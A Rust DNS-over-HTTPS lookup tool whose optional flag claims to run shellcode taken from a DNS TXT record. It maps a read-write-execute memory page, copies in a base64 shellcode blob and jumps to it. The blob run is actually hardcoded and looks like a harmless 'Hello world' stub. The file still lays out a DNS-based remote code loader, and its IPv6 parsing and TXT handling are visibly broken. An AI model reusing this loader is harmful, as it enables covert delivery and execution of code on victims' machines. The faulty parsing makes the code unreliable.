use std::{collections::HashMap, io::Cursor};

use dns_util::{
    http::{Client, HttpMethod, Request},
    DnsPacket, FromBytes, RecordType, ToBytes,
};
// use reqwest::Client;
use structopt::StructOpt;

#[derive(StructOpt)]
struct CliArgs {
    #[structopt(short = "r", long = "record-type", help = "which record type")]
    record_type: String,
    #[structopt(help = "domain name to lookup")]
    domain: String,
    #[structopt(
        short = "d",
        long = "dns-host",
        help = "dns host to use",
        default_value = "https://dns.google.com/dns-query"
    )]
    dns_host: String,

    #[structopt(
        short = "e",
        long = "execute-shellcode",
        help = "execute shell code from txt"
    )]
    exec_shellcode: bool,
}
#[tokio::main]
async fn main() {
    let args = CliArgs::from_args();
    let record_type = match args.record_type.as_str() {
        "*" | "any" | "ANY" => RecordType::ANY,
        "a" | "A" => RecordType::A(0),
        "aaaa" | "AAAA" => RecordType::AAAA(0),
        "txt" | "TXT" => RecordType::TXT(String::new()),
        "cname" | "CNAME" => RecordType::CNAME(String::new()),
        "mx" | "MX" => RecordType::MX(String::new()),
        _ => unimplemented!("Not implemented"),
    };
    let dns_package = base64::encode_config(
        &DnsPacket::builder()
            .add_query(args.domain.as_str(), record_type)
            .build()
            .to_vec()
            .expect("Invalid DNS"),
        base64::URL_SAFE_NO_PAD,
    );

    let mut client = Client::new();
    let mut headers = HashMap::new();
    headers.insert("accept".to_string(), "application/dns-message".to_string());
    headers.insert(
        "content-type".to_string(),
        "application/dns-message".to_string(),
    );
    let request = Request::new(
        format!("{}?dns={}", args.dns_host, dns_package)
            .parse()
            .unwrap(),
        HttpMethod::Get,
        headers,
        vec![],
    );
    let dns_response = client.send(request).await.unwrap().body;
    let response_package =
        DnsPacket::read(&mut Cursor::new(&dns_response)).expect("response was invalid");
    // println!("{:?}", response_package);
    println!("---- DNS ----");
    println!("---- QUERY ----");
    println!("{}", response_package.queries[0].name);
    println!("------");
    println!("---- ANSWERS ----");

    let mut shellcode = String::new();

    for answer in &response_package.answers {
        if let Ok(RecordType::A(ip)) = answer.get_record_type() {
            if answer.class == 1 {
                println!(
                    "A\t{}\tIN\t{}.{}.{}.{}",
                    answer.ttl,
                    (ip & 0xff_00_00_00) >> 24,
                    (ip & 0x00_ff_00_00) >> 16,
                    (ip & 0x00_00_ff_00) >> 8,
                    ip & 0x00_00_00_ff
                );
            }
        }
        if let Ok(RecordType::AAAA(ip)) = answer.get_record_type() {
            if answer.class == 1 {
                println!(
                    "AAAA\t{}\tIN\t{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
                    answer.ttl,
                    (ip & 0xff_00_00_00) >> 48,
                    (ip & 0x00_ff_00_00) >> 40,
                    (ip & 0x00_00_ff_00) >> 32,
                    ip & 0x00_00_00_ff,
                    (ip & 0xff_00_00_00) >> 24,
                    (ip & 0x00_ff_00_00) >> 16,
                    (ip & 0x00_00_ff_00) >> 8,
                    ip & 0x00_00_00_ff
                );
            }
        }

        if let Ok(RecordType::TXT(txt)) = answer.get_record_type() {
            if answer.class == 1 {
                println!("TXT\t{}\tIN\t{}", answer.ttl, txt);
                shellcode = txt;
            }
        }
        if let Ok(RecordType::CNAME(cname)) = answer.get_record_type() {
            if answer.class == 1 {
                println!("CNAME\t{}\tIN\t{}", answer.ttl, cname);
            }
        }
        if let Ok(RecordType::NS(ns)) = answer.get_record_type() {
            if answer.class == 1 {
                println!("NS\t{}\tIN\t{}", answer.ttl, ns);
            }
        }
        if let Ok(RecordType::MX(mx)) = answer.get_record_type() {
            if answer.class == 1 {
                println!("MX\t{}\tIN\t{}", answer.ttl, mx);
            }
        }
    }
    
    if args.exec_shellcode {

        println!("\n\n---- Running shell code {} from TXT record ----", shellcode);
        unsafe {
            let shellcode = "SDHbU0i4cmxkIQoAAABQSLhIZWxsbyB3b1C4BAAAAr8BAAAASI00JEjHwg4AAAAPBVhYWLgBAAACww==".to_string();
            run(&shellcode);
        }
    }
}

use libc::{
    c_uint, c_void, mmap, size_t, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE,
};
use std::mem;
use std::ptr;
use std::slice;

unsafe fn run(shell_code: &str) {
    // probably needs to be page aligned...
    let code_bytes: size_t = 4096;
    let shell_code = base64::decode(shell_code).unwrap();

    // This is the Linux-ism here
    // It might work on other 'nix-es, I don't know, but it would almost
    // certainly need a separate, Windows-specific implementation.
    let virtual_code_address: *mut c_void = mmap(
        ptr::null_mut(),
        code_bytes,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_ANONYMOUS | MAP_PRIVATE,
        0,
        0,
    );

    println!("virtual_code_address = {:?}", virtual_code_address);

    // write some code in
    {
        let temp_code: &mut [u8] =
            slice::from_raw_parts_mut(virtual_code_address as *mut u8, code_bytes);
        &temp_code[..shell_code.len()].copy_from_slice(&shell_code);
    }

    // I'm pretty sure that this, at least, is defined behavior.
    // Otherwise, it's impossible under Rust to take advantage of executable
    // pages allocated through mmap.
    let asm_func: extern "C" fn() -> c_uint = mem::transmute(virtual_code_address);

    // Finally, execute our function and extract the result.
    let out = asm_func();

    println!("out is {}", out);
}
